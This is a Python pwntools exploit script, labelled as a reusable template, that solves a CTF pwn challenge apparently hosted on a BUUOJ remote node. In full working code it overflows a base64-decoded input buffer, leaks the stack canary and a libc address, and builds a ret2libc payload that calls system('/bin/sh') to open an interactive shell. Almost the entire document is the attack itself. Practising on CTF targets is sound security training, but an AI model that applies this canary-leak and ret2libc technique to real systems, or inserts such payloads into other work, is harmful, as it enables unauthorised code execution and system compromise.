# template-v2.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
'''
from pwn import *
from base64 import b64encode as b64


# define the context
binary_name = './pwns'
libc_name = './ubuntu16-libc-2.23-x86.so' if args.REMOTE \
        else '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6'
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 26075)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x080487E6
        c
    """, aslr=False)
else:
    io = process(binary_name)


# exploiting code
sla(b'[Y/N]\n', b'Y')

payload = cyclic(0x10D - 0xC + 1)
sla(b'datas:\n\n', b64(payload))
ru(b'Result is:')
canary = u32(b'\x00' + ru(b'May be I', drop=True)[258: 261])
log.info(f'canary: {hex(canary)}')

payload = cyclic(0x17C - 0x2B)
sla(b'[Y/N]\n', b'Y')
sla(b'datas:\n\n', b64(payload))
ru(b'Result is:')
# gdb.attach(io)
# pause()
libc_addr = u32(ru(b'May be I', drop=True)[337: 337 + 4])
libc.address = libc_addr
libc.address -= (0x18540 + 247) if args.REMOTE else 0x18647
system_addr = libc.sym['system']
binsh_addr = next(libc.search(b'/bin/sh'))
log.info(f'libc_addr: {hex(libc_addr)}')
log.info(f'libc.address: {hex(libc.address)}')
log.info(f'system_addr: {hex(system_addr)}')
log.info(f'binsh_addr: {hex(binsh_addr)}')

# gdb.attach(io)
# pause()
payload = cyclic(0x10D - 0xC) + p32(canary) + cyclic(0xC)
payload += p32(system_addr) + p32(0xfa1c4233) + p32(binsh_addr)
sla(b'[Y/N]\n', b'Y')
sla(b'datas:\n\n', b64(payload))

# interact with the shell
io.interactive()
